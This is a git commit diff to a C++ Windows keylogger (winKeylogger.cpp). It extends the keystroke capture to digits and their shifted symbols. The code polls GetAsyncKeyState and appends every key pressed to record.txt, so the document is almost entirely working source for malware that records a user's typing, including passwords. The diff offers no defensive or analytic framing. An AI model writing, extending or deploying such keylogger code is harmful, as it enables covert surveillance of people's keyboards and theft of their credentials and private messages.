02e9df826812c2dee08d901cde9e82d27a2973b3
Surya Karmakar <surjokarmakarssj7@gmail.com>
2020-12-24 16:30:35 +0530

    version 1.1

--- winKeylogger.cpp
+++ winKeylogger.cpp
@@ -11,27 +11,83 @@ void keylog(){
 			if (GetAsyncKeyState(key) == -32767){
 				ofstream write ("record.txt", ios::app);
 
-				//Upper case
+				//...[+]Upper case.............................................................
 				//shift(0x10), cap lock(0x14)
 				if(((key>64) && (key<91)) && (GetAsyncKeyState(0x10))){
 					write << key;
 					write.close();
 					break;
 				}
-				// Lower Case
+				//...[+]Lower Case.............................................................
 				else if (((key>64) && (key<91)) && !(GetAsyncKeyState(0x10))){
 					key +=32;
 					write << key;           
 					write.close();
 					break;
-				}				
+				}
+
+				//...[+]Special Symbols.........................................................
+				else{
+					switch (key){
+						case 48:{
+							/*
+							if(GetAsyncKeyState(0x10)){
+								write << ")";
+								break;
+							}
+								
+							else{
+								write << key;
+								break;
+							}
+							*/
+							(GetAsyncKeyState(0x10)?write << ")":write << key);
+								break;	
+						}
+						case 49:{
+								(GetAsyncKeyState(0x10)?write << "!":write << key);
+								break;
+							}
+						case 50:{
+								(GetAsyncKeyState(0x10)?write << "@":write << key);
+								break;
+						}
+						case 51:{
+								(GetAsyncKeyState(0x10)?write << "#":write << key);
+								break;
+						}
+						case 52:{
+								(GetAsyncKeyState(0x10)?write << "$":write << key);
+								break;
+						}
+						case 53:{
+								(GetAsyncKeyState(0x10)?write << "%":write << key);
+								break;
+						}
+						case 54:{
+								(GetAsyncKeyState(0x10)?write << "^":write << key);
+								break;
+						}
+						case 55:{
+								(GetAsyncKeyState(0x10)?write << "&":write << key);
+								break;
+						}
+						case 56:{
+								(GetAsyncKeyState(0x10)?write << "*":write << key);
+								break;
+						}
+						case 57:{
+								(GetAsyncKeyState(0x10)?write << "(":write << key);
+								break;
+						}
+					}
+				}					
 			}
 		}
 	}
 }
 
-int main()
-{
+int main(){
 	keylog();
 	return 0;
 }
